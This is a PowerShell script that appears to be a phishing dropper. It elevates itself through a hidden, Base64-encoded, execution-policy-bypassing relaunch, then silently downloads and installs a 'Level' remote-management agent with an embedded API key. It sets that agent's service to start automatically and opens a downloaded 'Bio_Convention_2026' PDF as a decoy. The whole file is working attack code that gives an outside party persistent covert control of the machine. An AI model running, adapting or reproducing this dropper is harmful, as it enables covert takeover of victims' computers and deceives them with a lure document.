# Check for admin privileges and elevate if needed
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $scriptContent = @"
`$levelApiKey = "LEVEL_API_KEY=CUMHxGLc1pG31otXDEeiCRKg"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; `$tempFile = Join-Path ([System.IO.Path]::GetTempPath()) "level.msi"; `$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri "https://downloads.level.io/level.msi" -OutFile `$tempFile; `$ProgressPreference = 'Continue'; `$batFile = Join-Path ([System.IO.Path]::GetTempPath()) "install.bat"; `"@echo off`r`nmsiexec.exe /i ``"`$tempFile``" `$levelApiKey /qn >nul 2>&1`" | Out-File -FilePath `$batFile -Encoding ASCII; `$psi = New-Object System.Diagnostics.ProcessStartInfo; `$psi.FileName = `$batFile; `$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; `$psi.CreateNoWindow = `$true; `$psi.UseShellExecute = `$false; `$process = New-Object System.Diagnostics.Process; `$process.StartInfo = `$psi; `$process.Start() | Out-Null; `$process.WaitForExit(); Remove-Item `$batFile -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2; Start-Service -Name "Level" -ErrorAction SilentlyContinue; Set-Service -Name "Level" -StartupType Automatic -ErrorAction SilentlyContinue; `$pdfUrl = 'https://raw.githubusercontent.com/zizilgtm/cse3100-Project/main/Bio_Convention_2026_Korea_Bilingual.pdf'; `$pdfFile = Join-Path ([System.IO.Path]::GetTempPath()) 'Bio_Convention_2026.pdf'; `$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri `$pdfUrl -OutFile `$pdfFile; `$ProgressPreference = 'Continue'; Start-Process `$pdfFile;
"@
    $encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -Enc $encodedScript" -Wait
    exit
}

# Execute payload as administrator
$levelApiKey = "LEVEL_API_KEY=CUMHxGLc1pG31otXDEeiCRKg"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $tempFile = Join-Path ([System.IO.Path]::GetTempPath()) "level.msi"; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri "https://downloads.level.io/level.msi" -OutFile $tempFile; $ProgressPreference = 'Continue'; $batFile = Join-Path ([System.IO.Path]::GetTempPath()) "install.bat"; "@echo off`r`nmsiexec.exe /i `"$tempFile`" $levelApiKey /qn >nul 2>&1" | Out-File -FilePath $batFile -Encoding ASCII; $psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName = $batFile; $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; $psi.CreateNoWindow = $true; $psi.UseShellExecute = $false; $process = New-Object System.Diagnostics.Process; $process.StartInfo = $psi; $process.Start() | Out-Null; $process.WaitForExit(); Remove-Item $batFile -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2; Start-Service -Name "Level" -ErrorAction SilentlyContinue; Set-Service -Name "Level" -StartupType Automatic -ErrorAction SilentlyContinue; $pdfUrl = 'https://raw.githubusercontent.com/zizilgtm/cse3100-Project/main/Bio_Convention_2026_Korea_Bilingual.pdf'; $pdfFile = Join-Path ([System.IO.Path]::GetTempPath()) 'Bio_Convention_2026.pdf'; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfFile; $ProgressPreference = 'Continue'; Start-Process $pdfFile;
